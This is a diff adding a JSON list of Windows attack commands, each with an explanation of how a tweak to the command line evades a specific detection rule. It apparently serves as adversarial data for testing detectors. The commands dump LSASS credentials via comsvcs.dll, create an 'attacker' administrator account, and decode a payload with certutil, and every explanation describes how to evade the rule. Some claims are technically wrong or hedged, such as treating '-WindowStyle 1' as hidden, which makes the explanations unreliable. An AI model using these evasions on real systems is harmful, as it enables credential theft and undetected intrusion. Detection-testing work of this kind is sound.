@@ -1,0 +1,26 @@
+[
+{
+"output": "rundll32.exe C:\Windows\System32\"comsvcs".dll,MiniDump 624 C:\temp\lsass.dmp full",
+"explanation": "Insertion: Wrapped the 'comsvcs' library name inside double quotes. The rundll32 infrastructure strips quotes when mapping the library name parameter, ensuring the identical target memory dump behavior executes correctly. However, this separates the exact character grouping, evading the 'CommandLine|contains|all' verification for 'comsvcs' inside selection_child_1."
+},
+{
+"output": "rar.exe a -m5  -hpSecure123 C:\backup.rar C:\data\",
+"explanation": "Insertion: Injected a double space before the password switch (' -hp'). The selection_child_2 condition searches for a strict string sequence of ' -hp' (a single leading space). WinRAR safely parses irregular white spaces between parameter blocks without altering archiving behavior, effectively bypassing the exact space-padded rule criteria."
+},
+{
+"output": "net.exe user attacker Pass1234 /add ",
+"explanation": "Insertion: Added a trailing space at the very end of the command line string. While this command runs perfectly to create a user, it changes the spacing profile around the parameters. More importantly, using alternative tools like 'net1 user attacker Pass1234 /add' or inserting carets inside 'user' like 'net ^u^s^e^r attacker /add' will break the strict single-space string sequence requirement for ' user ' defined in selection_child_3."
+},
+{
+"output": "net1 localgroup administrators attacker /add",
+"explanation": "Substitution: Substituted the standard binary wrapper alias 'net' with its underlying architectural engine binary 'net1'. On Windows systems, the net command calls net1 to handle the group configuration payload natively. This allows administrative user adjustments to proceed seamlessly while missing the required literal keyword 'net' in the selection_child_4 parameter definition."
+},
+{
+"output": "powershell.exe -NoProfile -WindowStyle 1 C:\script.ps1",
+"explanation": "Substitution / Encoding: Substituted the string representation for the hidden window state ('-W Hidden') with its equivalent numerical enumeration flag alternative ('1' or 'Hidden' mapped differently like '-w 1'). The PowerShell engine handles integer parameters or abbreviated option variations identically, neutralizing the specific rule check for ' -W Hidden ' inside selection_child_6."
+},
+{
+"output": "certutil.exe -urlcache -f -decode="" C:\encoded.txt C:\decoded.exe",
+"explanation": "Insertion: Injected an empty quote string inside the assignment notation of the decode parameter ('-decode=""'). If certutil handles empty or split parameter mapping layers safely on execution, it decodes the payload flawlessly while masking the exact character layout sequence checked by ' -decode ' in selection_child_6."
+}
+]
